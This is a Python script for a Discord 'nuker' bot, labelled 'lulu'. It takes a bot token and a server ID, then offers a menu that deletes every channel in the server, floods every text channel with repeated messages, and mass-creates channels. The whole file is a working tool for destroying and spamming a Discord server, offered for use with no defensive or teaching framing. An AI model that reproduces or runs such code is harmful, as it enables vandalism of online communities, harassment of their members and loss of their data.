# lulu
import discord
from discord.ext import commands as purav
import asyncio as puravvv
import os

def erase():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')

async def delete_channels(guild):
    tasks = []
    for channel in guild.channels:
        tasks.append(channel.delete())
    await puravvv.gather(*tasks)

async def channelscr(guild, channel_name, amount):
    tasks = []
    for i in range(amount):
        tasks.append(guild.create_text_channel(f'{channel_name}'))
    await puravvv.gather(*tasks)

async def msgspam(guild, message, puravpapa):
    tasks = []
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            for _ in range(puravpapa):
                tasks.append(channel.send(message))
    await puravvv.gather(*tasks)

async def menu(bot, guild):
    while True:
        print("""
        ===========================
        | 1. Delete Channels      |
        | 2. Spam messages                             |
        | 3. Create Channels      |
        | 4. Exit                        |
        ===========================
        """)

        choice = input("Enter your choice: ")
        if choice == '1':
            print(f"Deleting all channels")
            await delete_channels(guild)
            print("All channels deleted")
        elif choice == '4':
            await bot.close()
            break
        elif choice == '3':
            channel_name = input("Enter channel name: ")
            amount = int(input("Enter amount of channel: "))
            print(f"Creating channels")
            await channelscr(guild, channel_name, amount)
            print(f"{amount} channels created")
        elif choice == '2':
            message = input("Enter the message to send: ")
            puravpapa = int(input("Enter the number of messages per channel: "))
            print(f"Spamming")
            await msgspam(guild, message, puravpapa)
            print(f"successfully spammed")
        else:
            print("Invalid choice. Please try again.")

async def main():
    token = input("Enter your bot token: ")
    guild_id = int(input("Enter the guild ID: "))

    intents = discord.Intents.all()
    
    bot = purav.Bot(command_prefix='puravpapa', intents=intents)

    @bot.event
    async def on_ready():
        print(f'Bot is ready. Logged in as {bot.user}')
        guild = bot.get_guild(guild_id)
        if not guild:
            print(f"Guild with ID {guild_id} not found.")
            await bot.close()
            return
        erase()

        print(f"Connected to guild: {guild.name}")
        await menu(bot, guild)

    await bot.start(token)

if __name__ == "__main__":
    puravvv.run(main())
    
